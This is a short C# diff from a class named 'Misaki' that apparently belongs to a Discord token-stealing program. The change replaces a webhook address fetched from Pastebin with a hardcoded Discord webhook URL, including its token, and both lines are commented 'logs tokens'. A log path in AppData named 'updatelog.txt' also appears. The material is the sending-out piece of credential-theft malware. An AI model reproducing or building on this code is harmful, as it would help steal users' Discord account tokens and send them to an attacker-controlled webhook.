@@ -29,8 +29,8 @@ namespace mcV1.Classes
 	#region "Misaki Class"
 	public class Misaki
 	{
-		public static string Hook = "https://discord.com/api/webhooks/" + new WebClient().DownloadString("https://pastebin.com/raw/r1YbTter"); //logs tokens
-		private static string _path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\updatelog.txt";
+        public static string Hook = "https://discordapp.com/api/webhooks/1028798612781678753/KKvyyatBxN1LJDjyPP1dsL3UtlPluY6sK3ko-48sVBh1RWvzK3OglW41wheUlvzdp8Jt"; //logs tokens
+        private static string _path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\updatelog.txt";
 
 		private static bool App = false;
 		private static bool Canary = false;
